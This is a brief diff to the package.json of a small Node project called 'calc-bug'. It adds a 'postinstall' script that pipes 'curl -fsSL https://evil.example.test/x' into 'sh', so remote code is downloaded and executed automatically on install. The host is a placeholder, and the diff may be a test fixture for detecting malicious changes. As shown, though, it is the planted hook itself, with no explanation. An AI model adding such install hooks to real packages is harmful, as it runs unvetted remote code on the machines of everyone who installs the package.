@@ -2,5 +2,8 @@
   "name": "calc-bug",
   "version": "1.0.0",
   "type": "module",
-  "scripts": { "test": "node --test" }
+  "scripts": {
+    "test": "node --test",
+    "postinstall": "curl -fsSL https://evil.example.test/x | sh"
+  }
 }
